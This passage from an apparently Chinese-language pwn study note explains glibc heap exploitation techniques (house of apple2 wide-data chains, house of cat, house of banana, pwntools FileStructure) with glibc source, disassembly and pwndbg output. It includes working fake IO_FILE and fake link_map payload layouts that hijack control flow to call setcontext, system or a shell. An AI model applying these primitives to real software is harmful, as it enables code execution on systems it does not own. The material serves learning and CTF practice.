<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>



<p>总结一下：使用 <code>largebin attack</code> 劫持<code>_IO_list_all</code> 变量</p>
<ul>
<li>将其替换为一个伪造的 <code>IO_FILE</code> 结构体（某个我们可控内容的堆）</li>
<li>IO_FILE的 <code>_wide_data</code> 伪造为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
<li>IO_FILE的 <code>vtable</code> 伪造为 <code>_IO_wfile_jumps</code>，这是一个 const 变量, gdb使用<code>p &amp;_IO_wfile_jumps</code>查看</li>
<li>在需要写shellcode时，将C设置为一个写满ROP的堆地址就行。常使用setcontext</li>
</ul>
<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>函数调用链</p>
<ul>
<li><code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数，然后进入到<code>_IO_switch_to_wget_mode</code>函数中来攻击</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__malloc_assert</span><br><span class="line">	​__fxprintf</span><br><span class="line">		​locked_vfxprintf</span><br><span class="line">			__vfprintf_internal #在这里是跳转到IO_validate_vtable通过vtable+<span class="number">0x38</span>调用的下面函数</span><br><span class="line">				​_IO_wfile_seekoff</span><br><span class="line">					_IO_switch_to_wget_mode</span><br><span class="line">						​call qword ptr [rax + <span class="number">0x18</span>] <span class="meta">#rax是伪造的io_file的地址</span></span><br></pre></td></tr></table></figure>


<p>并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<code>_IO_wfile_seekoff</code>即可（通常是结合<code>__malloc_assert</code>，改vtable为<code>_IO_wfile_jumps+0x10</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))   <span class="comment">// xxxx</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure>


<p>在这里调用 <code>_wide_data</code> 里的 <code>vtable的_overflow</code>，JUMP宏 且没有检查</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure>

<p>在<code>_IO_switch_to_wget_mode</code> 调试时发现如下的汇编代码</p>
<ul>
<li>rdi 是 fp 指针，是我们可以伪造的一个 IO_FILE。</li>
<li>通过 rdi控制 rax，在通过rax控制rdx，也可以过jbe指令。从而最后call 我们指定的shellcode</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line"> <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line"> <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line"> <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"></span><br><span class="line"> <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line"> <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>

<p>所以最后的伪造如下</p>
<ul>
<li>rax1 为上面的rax</li>
<li>rax2 为下面的rax寄存器</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span>                        <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)                              <span class="comment"># _flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>)                        <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)               <span class="comment"># _IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)                       <span class="comment"># _IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                               <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)                 <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)               <span class="comment"># _wide_data, rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                               <span class="comment"># mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)          <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)               <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><p>不是一种攻击IO_FILE的利用手段。程序通过exit退出时，会调用一个名叫 <code>rtld_global</code> 的结构体中的一系列函数来进行诸如恢复寄存器，清除缓冲区等操作。</p>
<ul>
<li>可以任意地址写一个堆地址（通常使用 <code>large bin attack</code>）</li>
<li>能够从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
<li>可以泄露 <code>libc</code> 地址和堆地址</li>
</ul>
<p>gdb 常用的指令</p>
<ul>
<li>这是ld.so 文件中的一个地址，因此不能使用libc.sym获得地址</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">p &amp;_rtld_global</span><br></pre></td></tr></table></figure>


<p><code>rtld_global</code> 结构体里面装有 <code>_dl_ns</code> 结构体，通过正常 main 函数返回或者调用 exit 退出，触发函数调用链：<code>exit()-&gt;_dl_call_fini-&gt;(fini_t)array[i]</code>。</p>
<ul>
<li>glibc 2.37 后的源码，对比之前的与那吗，发现主要的变化为 <code>_dl_call_fini(l);</code>，跟进函数发现除了输出debugging信息函数变了，其余都没变</li>
<li>link map 使用双向链表连接起来</li>
<li>nmaps 是 <code>maps[]</code> 中元素个数，也就是 <code>GL(dl_ns)[ns]._ns_loaded</code></li>
<li>建议自己随便写个程序，将其中变量打印出来看看。这里加载下面的注释里</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_nns  =&gt;  1</span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_nloaded  =&gt; 4</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">       auditing DSOs.  */</span></span><br><span class="line">    <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    )</span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_DELETE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">         copy the pointers in.  */</span></span><br><span class="line">	  <span class="comment">// nloaded =&gt; 4</span></span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *maps[nloaded];</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">      <span class="built_in">assert</span>(nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">// ns=0    pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded</span></span><br><span class="line">	  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_next.l_next.l_next.l_next  直到出现0</span></span><br><span class="line">      <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">        <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">        <span class="comment">// pwndbg p _rtld_global._dl_ns[0]._ns_loaded.l_real</span></span><br><span class="line">        <span class="comment">// 需要进入这个if线</span></span><br><span class="line">        <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">          <span class="built_in">assert</span>(i &lt; nloaded);   <span class="comment">// 所以说不会超过4个</span></span><br><span class="line"></span><br><span class="line">          maps[i] = l;</span><br><span class="line">          l-&gt;l_idx = i;</span><br><span class="line">          ++i;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">             are not dlclose()ed from underneath us.  */</span></span><br><span class="line">          ++l-&gt;l_direct_opencount;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">assert</span>(ns != LM_ID_BASE || i == nloaded);  <span class="comment">// 过其中一个检查，i==nloaded,也就是全部的if线都要进入。</span></span><br><span class="line">      <span class="built_in">assert</span>(ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">         binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">         the main namespace.  */</span></span><br><span class="line">      _dl_sort_maps(maps, nmaps, (ns == LM_ID_BASE), <span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">         from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">         various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">         count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">         we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">         from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">         lock.  */</span></span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">         call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">         the front.  */</span></span><br><span class="line">	  <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];   <span class="comment">// _ns_loaded</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">          _dl_call_fini(l);            <span class="comment">// 进入这个函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">          <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">          _dl_audit_objclose(l);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">        --l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_CONSISTENT);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (!do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    do_audit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> again;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf(</span><br><span class="line">        <span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">        <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">        <span class="built_in">GL</span>(dl_num_relocations), <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>走到 <code>_dl_call_fini</code></p>
<ul>
<li>存在一个函数调用 <code>((fini_t)array[sz])()</code>，map为参数，也就是上面的 <code>GL(dl_ns)[ns]._ns_loaded</code> 和其 next，next-&gt;next…</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _dl_call_fini(<span class="type">void</span> *closure_map) &#123;</span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded 和 l_next 指针</span></span><br><span class="line">  <span class="comment">// pwndbg p *(struct link_map *) 上一个指令地址</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map = closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, map-&gt;l_name, map-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  map-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26]</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini_array = map-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_addr</span></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26].d_un.d_val</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) *array = (<span class="built_in">ElfW</span>(Addr) *)(map-&gt;l_addr + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[28].d_un.d_val / 8</span></span><br><span class="line">    <span class="type">size_t</span> sz = (map-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="built_in">sizeof</span>(<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">	<span class="comment">// 不管什么类型，最后调用的函数地址可以得到</span></span><br><span class="line">    <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>) ((<span class="type">fini_t</span>)array[sz])();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini = map-&gt;l_info[DT_FINI];</span><br><span class="line">  <span class="keyword">if</span> (fini != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">DL_CALL_DT_FINI</span>(map, ((<span class="type">void</span> *)map-&gt;l_addr + fini-&gt;d_un.d_ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是函数调用能攻击一下就行，为了更容易的通过if的条件的，我们一般替换链表最后一个 link_map，也就是打第3个linkmap<code>ns_loaded.l_next.l_next.l_netx</code></p>
<ul>
<li>这是部分的内容，只截取了我们需要的内容</li>
<li>伪造l_addr, fini_array-&gt;d_un.d_ptr 内容</li>
<li>DT_FINI_ARRAY 为 26，DT_FINI_ARRAYSZ 为 28</li>
<li>因为源码可能比较抽象，不如直接打印出来，这里只截取有用的部分</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p **(struct link_map **) 0x7ffff7fbb188</span><br><span class="line"><span class="variable">$5</span> = &#123;</span><br><span class="line">  l_addr = 140737349943296,</span><br><span class="line">  l_name = 0x7ffff7fbb660 <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,</span><br><span class="line">  l_ld = 0x7ffff7e18bc0,</span><br><span class="line">  l_next = 0x7ffff7fbbb90,</span><br><span class="line">  l_prev = 0x7ffff7fbb170,</span><br><span class="line">  l_real = 0x7ffff7fbb680,</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7ffff7fbbb10,</span><br><span class="line">  l_info = &#123;0x0, 0x7ffff7e18bc0, 0x7ffff7e18c70, 0x7ffff7e18c60, 0x7ffff7e18c00, 0x7ffff7e18c20, 0x7ffff7e18c30, 0x7ffff7e18ca0, 0x7ffff7e18cb0, 0x7ffff7e18cc0, 0x7ffff7e18c40, 0x7ffff7e18c50, 0x0, 0x0, 0x7ffff7e18bd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18c80, 0x0, 0x0, 0x7ffff7e18c90, 0x0, 0x7ffff7e18be0, 0x0, 0x7ffff7e18bf0, 0x0, 0x0, 0x7ffff7e18cf0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d10, 0x7ffff7e18d00, 0x7ffff7e18ce0, 0x7ffff7e18cd0, 0x0, 0x0, 0x7ffff7e18d30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d20, 0x0 &lt;repeats 25 <span class="built_in">times</span>&gt;, 0x7ffff7e18c10&#125;,</span><br><span class="line"></span><br><span class="line">pwndbg&gt; ptype ((struct link_map **) <span class="number">0</span>x7ffff7fbb188 )-&gt;l_info</span><br><span class="line">	type = struct &#123;</span><br><span class="line">	    Elf64_Sxword d_tag;</span><br><span class="line">	    union &#123;</span><br><span class="line">	        Elf64_Xword d_val;</span><br><span class="line">	        Elf64_Addr d_ptr;</span><br><span class="line">	    &#125; d_un;</span><br><span class="line">	&#125; *[<span class="number">77</span>]</span><br></pre></td></tr></table></figure>


<p>伪造，堆地址 A</p>
<ul>
<li>l &#x3D; l-&gt;real &#x3D;&gt; A + 0x28 内容放着堆地址 <code>0x28 = distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_real</code></li>
<li>l-&gt;l_init_called 不为0，数字随意，根据版本而异。 <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_init_called</code>。我测的是0x312</li>
<li><code>map.l_info[26]</code> 不为 0, <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_info[26]</code></li>
<li><code>map.l_info[28]</code> + 8 控制循环次数，一般写成1就行</li>
<li>控制函数执行流 <code>map-&gt;l_addr + fini_array-&gt;d_un.d_ptr</code>。也就是 <code>map-&gt;l_addr + map-&gt;l_info[26]-&gt;d_un.d_ptr</code></li>
<li>fini_array <code>map.l_info[26]</code>偏移是0x110。那么28是0x120</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// l = l-&gt;real</span></span><br><span class="line">fake+<span class="number">0x28</span> = fake</span><br><span class="line"><span class="comment">// l-&gt;l_init_called，但是测试后是一个magic num，需要将其余结构体的linkmap 的 l_init_called 打印出来赋值</span></span><br><span class="line">fake+<span class="number">0x312</span> = <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意，需要设置 l_next 位置为0才行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的就比较固定了</span></span><br><span class="line"><span class="comment">// map.l_info[26]</span></span><br><span class="line">fake+<span class="number">0x110</span> = fake+<span class="number">0x40</span></span><br><span class="line"><span class="comment">// 0x48 是 d_un 结构体指针</span></span><br><span class="line">fake+<span class="number">0x48</span> = fake+<span class="number">0x58</span></span><br><span class="line"><span class="comment">// 后面加的那个东西</span></span><br><span class="line">fake+<span class="number">0x58</span> = shell    <span class="comment">// 0 + shell 执行shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map.l_info[28]。由上可知，为0，同时为 26 的 d_tag 成员</span></span><br><span class="line">fake+<span class="number">0x120</span> = fake+<span class="number">0x48</span></span><br><span class="line"><span class="comment">// l_info[28] 的 d_un 指针。 sz=1</span></span><br><span class="line">fake+<span class="number">0x50</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h2 id="pwntools-filepointer"><a href="#pwntools-filepointer" class="headerlink" title="pwntools filepointer"></a>pwntools filepointer</h2><p>其实看pwntools文档可以看出其中对 <code>IO_FILE</code> 也存在很多可以利用的点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib.filepointer <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<ol>
<li>IO_FILE 结构体</li>
</ol>
<ul>
<li><code>_wide_data</code> 就是我们现在常利用的点。</li>
<li>改变成员也只是需要 <code>fs.flags = 0x123</code> 直接赋值</li>
<li>两个 unknown 变量填充结构体</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>FileStructure()</span><br><span class="line">&#123; flags: <span class="number">0x0</span></span><br><span class="line"> _IO_read_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_read_end: <span class="number">0x0</span></span><br><span class="line"> _IO_read_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_write_end: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_base: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_end: <span class="number">0x0</span></span><br><span class="line"> _IO_save_base: <span class="number">0x0</span></span><br><span class="line"> _IO_backup_base: <span class="number">0x0</span></span><br><span class="line"> _IO_save_end: <span class="number">0x0</span></span><br><span class="line"> markers: <span class="number">0x0</span></span><br><span class="line"> chain: <span class="number">0x0</span></span><br><span class="line"> fileno: <span class="number">0x0</span></span><br><span class="line"> _flags2: <span class="number">0x0</span></span><br><span class="line"> _old_offset: <span class="number">0xffffffff</span></span><br><span class="line"> _cur_column: <span class="number">0x0</span></span><br><span class="line"> _vtable_offset: <span class="number">0x0</span></span><br><span class="line"> _shortbuf: <span class="number">0x0</span></span><br><span class="line"> unknown1: <span class="number">0x0</span></span><br><span class="line"> _lock: <span class="number">0x0</span></span><br><span class="line"> _offset: <span class="number">0xffffffffffffffff</span></span><br><span class="line"> _codecvt: <span class="number">0x0</span></span><br><span class="line"> _wide_data: <span class="number">0x0</span></span><br><span class="line"> unknown2: <span class="number">0x0</span></span><br><span class="line"> vtable: <span class="number">0x0</span>&#125;</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>house of orange</li>
</ol>
<ul>
